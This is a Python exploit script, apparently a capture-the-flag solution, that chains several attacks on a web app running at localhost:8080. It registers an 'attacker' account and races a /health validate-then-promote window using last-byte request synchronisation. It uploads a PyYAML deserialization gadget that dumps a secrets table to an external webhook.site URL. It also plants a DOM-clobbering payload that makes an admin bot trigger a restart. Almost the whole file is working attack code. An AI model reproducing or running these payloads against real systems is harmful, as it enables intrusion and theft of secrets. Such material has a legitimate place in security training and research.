import requests
import urllib.parse
import socket
import threading
import time

TARGET_HOST = "localhost"
TARGET_PORT = 8080
TARGET_URL = f"http://{TARGET_HOST}:{TARGET_PORT}"
WEBHOOK_URL = "https://webhook.site/cb2fc4b7-de27-4172-881f-6a97b5c7ed36"

SAFE_PLACEHOLDER = 'version: "1.0"\n'

session = requests.Session()


def register_and_login():
    """Creates a new account and logs in. Returns the raw session_token value."""
    print("[+] Step 0: Registering and authenticating attacker account...")

    session.post(f"{TARGET_URL}/api/v1/auth/register", json={"username": "attacker", "password": "password123"})

    resp = session.post(f"{TARGET_URL}/api/v1/auth/login", json={"username": "attacker", "password": "password123"})

    if resp.status_code != 200:
        print("[-] Auth failed.")
        exit(1)

    print("[*] Successfully authenticated.")
    return session.cookies.get('session_token')


def generate_yaml_payload():
    """Payload targets the DatabaseExporter gadget to dump the secrets table."""
    print("[+] Building the PyYAML SQL Exfiltration gadget...")
    return f"""version: "1.0"
user_profile: "Attacker"
trigger_exploit: !!python/object/apply:app.utils.cluster_utils.DatabaseExporter
  kwds:
    query: "SELECT secret_value FROM system_secrets WHERE secret_name='FLAG';"
    export_url: "{WEBHOOK_URL}"
"""


def stage_safe_placeholder():
    """Normal request: stage a harmless backup so /health has something to
    validate and promote. This is what makes /health's promotion codepath
    reachable at all -- the race is about what it promotes, not whether it does."""
    files = {'file': ('profile.yml', SAFE_PLACEHOLDER, 'application/x-yaml')}
    session.post(f"{TARGET_URL}/api/v1/users/me/backup/restore", files=files)


# ==========================================
# LAST-BYTE SYNC RACE PRIMITIVES
# ==========================================
# /health validates whatever is currently staged, audit-logs the promotion
# (a real DB round trip -- tens of ms), and only then copies the staged file
# to the path the next boot deserializes. If a malicious re-upload lands in
# that gap, the promoted file won't match what was validated.
#
# Rather than flooding with complete requests and hoping, we hold each
# request back by its final byte and release multiple prepared requests
# within microseconds of each other, so their handlers start executing at
# (near) the same instant.

def _build_health_request():
    req = (
        "GET /api/v1/infra/health HTTP/1.1\r\n"
        f"Host: {TARGET_HOST}:{TARGET_PORT}\r\n"
        "Connection: close\r\n"
        "\r\n"
    )
    return req.encode()


def _build_malicious_upload_request(token, payload):
    boundary = "----RaceBoundary7331"
    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="file"; filename="profile.yml"\r\n'
        f"Content-Type: application/x-yaml\r\n\r\n"
        f"{payload}\r\n"
        f"--{boundary}--\r\n"
    ).encode()

    headers = (
        "POST /api/v1/users/me/backup/restore HTTP/1.1\r\n"
        f"Host: {TARGET_HOST}:{TARGET_PORT}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Cookie: session_token={token}\r\n"
        "Connection: close\r\n"
        "\r\n"
    ).encode()

    return headers + body


def _open_and_prime(request_bytes):
    """Send everything except the final byte, leaving the request parked
    server-side waiting for the last byte before it's considered complete."""
    sock = socket.create_connection((TARGET_HOST, TARGET_PORT), timeout=10)
    sock.sendall(request_bytes[:-1])
    return sock, request_bytes[-1:]


def _drain(sock):
    try:
        sock.settimeout(5)
        while sock.recv(4096):
            pass
    except Exception:
        pass
    finally:
        sock.close()


def race_round(token, payload):
    health_sock, health_last = _open_and_prime(_build_health_request())
    upload_sock, upload_last = _open_and_prime(_build_malicious_upload_request(token, payload))

    # Release health's last byte first so its handler starts reading the
    # (currently safe) staged content, then release the malicious upload's
    # last byte immediately after, aiming to land inside the validate -> DB
    # audit log -> promote window.
    health_sock.sendall(health_last)
    upload_sock.sendall(upload_last)

    t1 = threading.Thread(target=_drain, args=(health_sock,))
    t2 = threading.Thread(target=_drain, args=(upload_sock,))
    t1.start()
    t2.start()
    t1.join(timeout=6)
    t2.join(timeout=6)


def trigger_admin_bot():
    print("[+] Crafting DOM Clobbering payload...")

    clobber_payload = '<form id="STEWARD_STATUS_CONFIG" action="/api/v1/infra/maintenance/restart" method="POST"></form>'
    encoded_bio = urllib.parse.quote(clobber_payload)

    weaponized_url = f"{TARGET_URL}/profile/attacker?bio={encoded_bio}"

    print(f"[*] Dispatching Admin Bot to {weaponized_url}")
    session.post(f"{TARGET_URL}/api/v1/support/ticket", json={"url": weaponized_url})


if __name__ == "__main__":
    print("==================================================")
    print("      RETURN BY DEATH - AUTOMATED EXPLOIT         ")
    print("==================================================")

    token = register_and_login()
    payload = generate_yaml_payload()

    ROUNDS_PER_ATTEMPT = 40
    MAX_ATTEMPTS = 8

    for attempt in range(1, MAX_ATTEMPTS + 1):
        print(f"\n[+] Attempt {attempt}/{MAX_ATTEMPTS}: staging safe placeholder and racing /health...")
        stage_safe_placeholder()

        for _ in range(ROUNDS_PER_ATTEMPT):
            race_round(token, payload)

        print("[*] Race burst complete. Triggering admin bot to attempt the restart...")
        trigger_admin_bot()

        print(f"[+] Waiting for possible DB exfiltration at {WEBHOOK_URL} ...")
        print("[*] Check the webhook now. If nothing arrived, the race will retry automatically.")
        time.sleep(5)

    print("\n[+] Exhausted attempts. If the flag never arrived, re-run -- race outcomes are probabilistic.")
